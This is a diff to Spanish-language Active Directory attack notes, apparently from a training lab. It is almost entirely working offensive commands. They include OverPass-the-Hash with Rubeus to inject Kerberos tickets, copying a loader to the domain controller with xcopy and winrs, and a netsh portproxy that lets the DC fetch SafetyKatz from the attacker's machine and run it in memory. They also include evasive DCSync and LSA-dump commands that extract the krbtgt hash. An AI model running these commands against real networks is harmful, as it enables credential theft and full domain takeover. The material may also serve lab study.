@@ -59,7 +59,7 @@ Notes:
 ## OverPass The Hash - Rubeus 
 
 ```powershell 
-! Usuario de dominio (AD) 
+! Usuario de dominio (AD) con permisos de Administrador Local 
 
 # Solicitar un Ticket Granting Ticket (TGT) de Kerberos usando el hash NTLM (RC4) del usuario y lo inyecta en la sesión actual (/ptt)
 ❯ .\Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
@@ -76,8 +76,15 @@ Notes:
 ❯ .\Loader.exe -path C:\AD\Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
 
 Notes:
-	1. Over Pass The Hash (OPTH) generate tokens from hashes or keys
+	1. Over Pass The Hash (OPTH) crea un CMD con tickets Kerberos de svcadmin (usuario dado)
 	2. Ejecutar comandos 
+```
+
+```powershell 
+# Forma 2 de conectarse al server (Es la mejor forma de conectarse) ya que te da una Powershell 
+❯ Enter-PSSession -ComputerName server01.domain01.local    # Ingresar al server donde tenemos acceso administrativo remoto
+	❯ $env:username
+	❯ $env:computername
 ```
 
 ```powershell
@@ -87,13 +94,24 @@ Notes:
 ## DCSync 
 
 ```powershell 
+# Compartir el Loader en la sesión (cmd) con OPTH que tiene el ticket inyectado
+❯ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y    # Copiar Loader al DC desde la PC atacante
+❯ winrs -r:dcorp-dc cmd     # Ingresar al server DC
+
+# Ejecutar desde dentro del DC
+❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
+# Funciona para ejecutar directamente 'SafetyKatz' directamente en el DC sin descargarlo 
+```
+
+```powershell 
 ! Usuario de dominio (AD) con permisos de Administrador 
 
-# Ejecutar un DCSync para solicitar al Domain Controller los hashes del usuario krbtgt, simulando comportamiento de replicación de AD
-❯ .\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" 
+# Ejecutar SafetyKatz dentro del DC a través de un loader para realizar un DCSync evasivo, solicitando al Domain Controller los hashes del usuario krbtgt
+❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"   # Primer comando a ejecutar 
+	# path = Indicar la ruta donde se encuentra Safetikatz de la máquina de atacante
 
-# Ejecutar SafetyKatz a través de un loader para realizar un DCSync evasivo, solicitando al Domain Controller los hashes del usuario krbtgt
-❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit" 
+❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"  # Segundo comando a ejecutar 
+❯ .\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit" 
 
 
 Nota:
